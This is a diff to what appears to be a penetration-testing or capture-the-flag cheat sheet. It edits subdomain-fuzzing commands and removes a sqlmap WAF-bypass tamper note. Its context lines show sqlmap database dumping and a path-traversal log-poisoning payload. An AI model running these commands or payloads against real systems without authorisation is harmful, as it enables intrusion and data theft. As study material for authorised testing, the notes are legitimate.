@@ -8,15 +8,9 @@ subdinder -d target.com -silent | dnsx -silent | gau
 ---
 # Discover subdomains:
 ```
-wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
+wfuzz -c -w wordlist -u "http://domain.com" -H "Host: FUZZ.domain.com" -fw 125
 
-gobuster vhost -u http://holo.live -w /usr/share/seclists/Discovery/DNS/subdomains.txt -t 30
-
-wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://cmess.thm" -H "Host: FUZZ.cmess.thm" -fw 125
-
-ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nahamstore.thm"
-
-amass enum -brute -passive -d nahamstore.com | anew subdomains.txt
+ffuf -u http://domain.com -w wordlist -H "Host: FUZZ.domain.com"
 ```
 ---
 # Discover files with `wfuzz` :
@@ -66,13 +60,12 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ```
 ---
 # sql
+## sqlmap
 ```bash
 sqlmap -r req.txt -p <parametr> --dbs
 sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables
 sqlmap -r req.txt -D <database_name> -T <table_name> --columns
 sqlmap -r req.txt-p  -D <database_name> --dump-all
-
---tamper=space2comment #bypass waf
 ```
 ## mysql
 ```sql
